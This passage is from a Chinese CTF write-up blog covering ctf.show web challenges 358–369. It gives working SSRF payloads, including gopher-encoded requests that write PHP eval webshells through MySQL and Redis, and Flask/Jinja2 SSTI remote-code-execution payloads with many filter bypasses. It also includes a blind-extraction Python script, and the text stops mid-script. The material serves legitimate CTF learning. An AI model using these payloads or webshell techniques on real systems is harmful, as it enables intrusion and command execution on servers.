title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则意思是以<code>http://ctf.</code>开头，以<code>show</code>结尾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure><p>可以自己看下各个部分代表什么</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://ctf.@127.0.0.1/flag.php#show&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p>提示<code>打无密码的mysql</code>，利用该<a href="https://github.com/tarunkant/Gopherus">工具</a>打<code>Gopher</code></p><p><img src="/.io//MyBlog\Blogs\ctfshowPics\web359.png"></p><p>放到<code>returl</code>然后对后面部分再次<code>url</code>编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">returl=gopher://127.0.0.1:3306/_%25%61%33%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%37%25%33%32%25%33%35%25%33%35%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%32%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%34%35%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%32%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%33%31%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%32%32%25%32%30%25%36%39%25%36%65%25%37%34%25%36%66%25%32%30%25%36%66%25%37%35%25%37%34%25%36%36%25%36%39%25%36%63%25%36%35%25%32%30%25%32%32%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30%25%32%32%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31&amp;u=Username</span><br></pre></td></tr></table></figure><p>访问<code>a.php</code>命令执行即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://df264cae-259e-47bf-9466-87850c93f6a3.challenge.ctf.show/a.php</span><br><span class="line">POST：</span><br><span class="line">1=system(&quot;cat /flag.txt&quot;);</span><br></pre></td></tr></table></figure><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>提示<code>打redis</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>Gopherus</code></p><p><img src="/.io//MyBlog\Blogs\ctfshowPics\web360.png" alt="web360"></p><p>注意要两次<code>url</code>编码，并且默认生成的是<code>shell.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=gopher://127.0.0.1:6379/_%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%30%41%66%6c%75%73%68%61%6c%6c%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%25%30%44%25%30%41%31%25%30%44%25%30%41%25%32%34%32%38%25%30%44%25%30%41%25%30%41%25%30%41%25%33%43%25%33%46%70%68%70%25%32%30%65%76%61%6c%25%32%38%25%32%34%5f%50%4f%53%54%25%35%42%31%25%35%44%25%32%39%25%33%42%25%33%46%25%33%45%25%30%41%25%30%41%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%31%33%25%30%44%25%30%41%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%39%25%30%44%25%30%41%73%68%65%6c%6c%2e%70%68%70%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%73%61%76%65%25%30%44%25%30%41%25%30%41</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://3f5ff281-2fcd-4eb5-9043-323fdb5c4ed8.challenge.ctf.show/shell.php</span><br><span class="line">POST：</span><br><span class="line">1=system(&quot;cat /flaaag&quot;);</span><br></pre></td></tr></table></figure><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>网上找到的一些有用的知识点</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    get传参</span><br><span class="line">request.values.x1  所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1    post传参(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data   post传参(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>网上的一些过滤器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>()：将值转换为<span class="built_in">int</span>类型；</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>()：将值转换为<span class="built_in">float</span>类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=<span class="number">255</span>,killwords=<span class="literal">False</span>)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;<span class="string">&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;</span>|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line"><span class="built_in">abs</span>()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line"><span class="built_in">format</span>(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; <span class="string">&quot;%s&quot;</span> - <span class="string">&quot;%s&quot;</span>|<span class="built_in">format</span>(<span class="string">&#x27;Hello?&#x27;</span>,<span class="string">&quot;Foo!&quot;</span>) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line"><span class="built_in">sum</span>()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(<span class="string">&#x27;xiaotuo&#x27;</span>)----如果name不存在，则会使用xiaotuo来替代。boolean=<span class="literal">False</span>默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用<span class="keyword">or</span>来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br></pre></td></tr></table></figure><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>提示<code>名字就是考点</code>，所以猜测注入点是参数<code>name</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&quot;popen&quot;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>过滤了数字<code>2</code>和<code>3</code></p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>多个<code>1</code>相加</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;().__class__.__mro__[1].__subclasses__()[1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1].__init__.__globals__[&quot;popen&quot;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>利用<code>(dict(a=b,c=d)|join|count)</code>构造出<code>2</code>，然后<code>66*2=132</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;% set e=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;().__class__.__mro__[1].__subclasses__()[e*66].__init__.__globals__[&quot;popen&quot;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 也可以用([a,b]|count)构造出2</span><br><span class="line">/?name=&#123;% set e=([a,b]|count)%&#125;&#123;&#123;().__class__.__mro__[1].__subclasses__()[e*66].__init__.__globals__[&quot;popen&quot;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p><code>x</code>可以是任意一个字母</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h3><p>利用<code>url_for</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">/?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>过滤了<code>&#39;</code>和<code>&quot;</code></p><h3 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h3><p>利用<code>request.arg</code>绕过过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h3 id="方法2-1"><a href="#方法2-1" class="headerlink" title="方法2"></a>方法2</h3><p>通过<code>url_for</code>找到<code>chr</code>来拼接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">/?name=&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__.__builtins__.eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="方法3-1"><a href="#方法3-1" class="headerlink" title="方法3"></a>方法3</h3><p>利用<code>config</code>拿到字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># popen</span><br><span class="line">/?name=&#123;&#123;config.__str__()[17]%2bconfig.__str__()[2]%2bconfig.__str__()[17]%2bconfig.__str__()[43]%2bconfig.__str__()[3]&#125;&#125;</span><br><span class="line"></span><br><span class="line">/?name=&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[config.__str__()[17]%2bconfig.__str__()[2]%2bconfig.__str__()[17]%2bconfig.__str__()[43]%2bconfig.__str__()[3]](request.args.b).read()&#125;&#125;&amp;b=cat /flag</span><br></pre></td></tr></table></figure><h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>在上一题基础上又过滤了<code>args</code>，可以使用<code>cookies</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.cookies.a](request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">a=popen;b=cat /flag;</span><br></pre></td></tr></table></figure><h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>又过滤了中括号<code>[]</code></p><h3 id="方法1-2"><a href="#方法1-2" class="headerlink" title="方法1"></a>方法1</h3><p>直接用<code>.</code>就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;x.__init__.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">a=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="方法2-2"><a href="#方法2-2" class="headerlink" title="方法2"></a>方法2</h3><p>使用<code>getitem</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;x.__init__.__globals__.__getitem__(request.cookies.b).eval(request.cookies.a)&#125;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">a=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read();b=__builtins__;</span><br></pre></td></tr></table></figure><h3 id="方法3-2"><a href="#方法3-2" class="headerlink" title="方法3"></a>方法3</h3><p>使用<code>request.values</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;x.__init__.__globals__.__getitem__(request.values.b).eval(request.values.a)&#125;&#125;&amp;b=__builtins__&amp;a=__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h2><p>在前面的基础上又过滤了<code>_</code>，考虑用<code>lipsum</code>和<code>attr过滤器</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br><span class="line"></span><br><span class="line">/?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h2><p>在前面的基础上又过滤了<code>os</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="line"></span><br><span class="line">/?name=&#123;&#123;(lipsum|attr(request.values.x1)).get(request.values.x2).popen(request.values.x3).read()&#125;&#125;&amp;x2=os&amp;x3=cat /flag&amp;x1=__globals__</span><br></pre></td></tr></table></figure><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>过滤了<code>&#123;&#123;&#125;&#125;</code></p><h3 id="方法1-3"><a href="#方法1-3" class="headerlink" title="方法1"></a>方法1</h3><p>可以直接用<code>&#123;%%&#125;</code>和<code>print</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;%print((x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5))%&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="方法2-3"><a href="#方法2-3" class="headerlink" title="方法2"></a>方法2</h3><p>不用<code>print</code>，直接盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://36f667b8-3e4a-4639-ba96-cff20a8e3c86.challenge.ctf.show/&#x27;</span></span><br><span class="line">alp = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> alp:</span><br><span class="line"><span class="comment"># time.sleep(0.1)</span></span><br><span class="line">payload = <span class="string">&quot;&#123;% set flag = (x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)%&#125;&#123;% if flag == request.values.x6%&#125;evo1ution&#123;%endif%&#125;&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>: payload,</span><br><span class="line"><span class="string">&#x27;x1&#x27;</span>: <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;x2&#x27;</span>: <span class="string">&#x27;__globals__&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;x3&#x27;</span>: <span class="string">&#x27;__getitem__&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;x4&#x27;</span>: <span class="string">&#x27;__builtins__&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;x5&#x27;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line"><span class="string">&#x27;x6&#x27;</span>: <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url,params=params)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;evo1ution&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">flag += j</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ctfshow&#123;8ff9262c-1994-4916-abaf-e24871b2d07a&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>过滤了<code>request</code></p><h3 id="方法1-4"><a href="#方法1-4" class="headerlink" title="方法1"></a>方法1</h3><p>字符拼接</p><p>想使用<code>&#123;%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%&#125;</code>，所以用下面的脚本拼接出<code>__globals__</code>、<code>os</code>和<code>cat /flag</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span 